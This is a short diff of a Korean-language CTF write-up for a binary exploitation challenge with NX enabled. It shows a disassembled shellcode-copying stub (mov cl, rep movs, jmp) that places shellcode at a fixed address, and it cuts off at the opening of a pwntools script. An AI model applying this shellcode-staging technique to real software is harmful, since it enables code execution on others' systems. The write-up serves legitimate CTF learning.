@@ -262,10 +262,12 @@ wetware와 동일하다 다른 점은 nx비트가 걸려있다는 것, 그리고
 해서 사용한건
 
 >    0:   b1 10                   mov    cl,0x10
+>
 >    2:   f3 a5                   rep movs DWORD PTR es:[rdi],DWORD PTR ds:[rsi]
+>
 >    4:   eb 4a                   jmp    0x50
 
-이렇게 썼다! rep가 실행되면 0x40021d에 쉘코드가 박히는데 jmp 0x40021d 만들려고 또 이것 저것...
+요것! rep가 실행되면 0x40021d에 쉘코드가 박히는데 jmp 0x40021d 만들려고 또 이것 저것...
 
 ```python
 from pwn import *
